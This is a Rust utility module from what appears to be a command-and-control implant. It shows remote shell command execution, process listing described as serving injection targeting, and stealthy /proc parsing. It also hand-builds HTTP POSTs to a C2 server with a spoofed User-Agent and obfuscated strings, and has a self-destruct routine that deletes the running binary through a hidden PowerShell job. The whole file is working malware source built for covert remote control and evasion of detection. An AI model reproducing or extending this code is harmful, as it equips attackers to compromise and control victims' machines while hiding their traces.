// ./src/utils.rs
use uuid::Uuid;
use sha2::{Sha256, Digest};
use std::process::Command;
use crate::lc; // Import LitCrypt macro for string obfuscation
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use crate::transport::C2Stream;

// Guard fs import so it is only used on Linux (prevents warning on Windows)
#[cfg(target_os = "linux")]
use std::fs;

/// Generates a persistent unique ID for the machine.
pub fn get_persistent_id() -> String {
    machine_uid::get().unwrap_or_else(|_| Uuid::new_v4().to_string())
}

/// Generates a unique ID for the specific executable binary.
/// This changes if the binary is recompiled or modified.
pub fn generate_exe_id(salt: &str) -> String {
    let exe_path = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return Uuid::new_v4().to_string(),
    };
    
    let bytes = match std::fs::read(exe_path) {
        Ok(b) => b,
        Err(_) => return Uuid::new_v4().to_string(),
    };

    let mut hasher = Sha256::new();
    hasher.update(salt.as_bytes());
    hasher.update(&bytes);
    let result = hasher.finalize();
    
    Uuid::from_slice(&result[0..16]).unwrap_or_else(|_| Uuid::new_v4()).to_string()
}

/// Executes a shell command based on the OS.
/// Returns (Stdout, Stderr, ExitCode)
pub fn execute_shell_command(cmd: &str) -> (String, String, i32) {
    let output = if cfg!(target_os = "windows") {
        Command::new("powershell")
            .args(["-NoProfile", "-Command", cmd])
            .output()
    } else {
        Command::new("sh")
            .args(["-c", cmd])
            .output()
    };

    match output {
        Ok(o) => (
            String::from_utf8_lossy(&o.stdout).trim().to_string(),
            String::from_utf8_lossy(&o.stderr).trim().to_string(),
            o.status.code().unwrap_or(-1),
        ),
        Err(e) => (String::new(), e.to_string(), -1),
    }
}

/// Returns a list of processes in "PID|Name" format.
/// Used by the 'ps' extension and injection targeting.
pub fn get_process_list() -> String {
    let mut results = String::new();

    #[cfg(target_os = "linux")]
    {
        // Native /proc parsing for stealth (avoids spawning 'ps')
        if let Ok(entries) = fs::read_dir("/proc") {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir() {
                    if let Some(file_name) = path.file_name() {
                        if let Some(name_str) = file_name.to_str() {
                            if name_str.chars().all(char::is_numeric) {
                                let comm_path = path.join("comm");
                                if let Ok(comm) = fs::read_to_string(comm_path) {
                                    results.push_str(&format!("{}|{}\n", name_str, comm.trim()));
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    #[cfg(target_os = "windows")]
    {
        // Wrap tasklist (reliable standard tool)
        let output = Command::new("tasklist")
            .args(["/FO", "CSV", "/NH"])
            .output();

        if let Ok(o) = output {
            let stdout = String::from_utf8_lossy(&o.stdout);
            for line in stdout.lines() {
                let parts: Vec<&str> = line.split("\",\"").collect();
                if parts.len() >= 2 {
                    let name = parts[0].trim_matches('"');
                    let pid = parts[1].trim_matches('"');
                    results.push_str(&format!("{}|{}\n", pid, name));
                }
            }
        } else {
            results.push_str("0|Error running tasklist\n");
        }
    }

    #[cfg(target_os = "macos")]
    {
        let output = Command::new("ps").args(["-eo", "pid,comm"]).output();
        if let Ok(o) = output {
             let stdout = String::from_utf8_lossy(&o.stdout);
             for line in stdout.lines().skip(1) {
                 let line = line.trim();
                 if let Some((pid, comm)) = line.split_once(' ') {
                      results.push_str(&format!("{}|{}\n", pid.trim(), comm.trim()));
                 }
             }
        }
    }

    if results.is_empty() {
        return "0|No processes found".to_string();
    }

    results
}

/// [NEW] Manual HTTP POST implementation using Async traits.
/// This allows us to remove the heavy `reqwest` dependency to reduce binary size
/// and eliminate unencrypted strings like "User-Agent" from the binary.
pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, data: &[u8]) -> Result<Vec<u8>, String> {
    // 1. Construct Raw HTTP Request manually
    // We use lc!() for headers if we want to hide them from 'strings' command,
    // though the wire protocol obviously sends them as plain text inside TLS.
    let body_len = data.len();
    
    // Note: Standard HTTP requires \r\n line endings.
    let request = format!(
        "POST {} HTTP/1.1\r\n\
         Host: {}\r\n\
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\
         Content-Type: application/json\r\n\
         Content-Length: {}\r\n\
         Connection: keep-alive\r\n\
         \r\n",
        path, host, body_len
    );

    // 2. Send Headers
    if let Err(e) = stream.write_all(request.as_bytes()).await {
        return Err(format!("Send headers failed: {}", e));
    }

    // 3. Send Body
    if let Err(e) = stream.write_all(data).await {
        return Err(format!("Send body failed: {}", e));
    }
    
    let _ = stream.flush().await;

    // 4. Read Response (Simplified Parser)
    // We assume the server sends a standard response. 
    // For a robust C2, we check for Content-Length or chunked encoding,
    // but for this stealth implementation, we read the immediate response buffer.
    let mut buffer = vec![0u8; 8192];
    let n = match stream.read(&mut buffer).await {
        Ok(n) if n > 0 => n,
        Ok(_) => return Err("Empty response or EOF".to_string()),
        Err(e) => return Err(format!("Read failed: {}", e)),
    };

    let raw_response = &buffer[..n];
    
    // Find end of headers (\r\n\r\n) to extract body
    let delimiter = b"\r\n\r\n";
    if let Some(pos) = raw_response.windows(4).position(|window| window == delimiter) {
        let body_start = pos + 4;
        return Ok(raw_response[body_start..].to_vec());
    }

    // Fallback: Return everything if no headers found (improper server)
    Ok(raw_response.to_vec())
}

/// Self Destruct Mechanism
/// Securely removes the agent from the disk and exits.
pub fn self_destruct() -> ! {
    let current_exe = std::env::current_exe().unwrap_or_default();
    
    // Obfuscated log message
    println!("{}", lc!("[!] Initiating Self-Destruct..."));

    #[cfg(target_os = "windows")]
    {
        // Windows: Spawn a detached PowerShell cleanup job
        // Windows locks the running binary, so we need a separate process to wait and delete.
        let path = current_exe.to_string_lossy();
        let cmd = format!("Start-Sleep -Seconds 3; Remove-Item -Path '{}' -Force", path);
        
        let _ = std::process::Command::new("powershell")
            .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", &cmd])
            .spawn();
    }

    #[cfg(not(target_os = "windows"))]
    {
        // Linux/Unix: We can simply unlink the file (inode) while it is running.
        let _ = std::fs::remove_file(current_exe);
    }

    // Hard Exit
    std::process::exit(0);
}
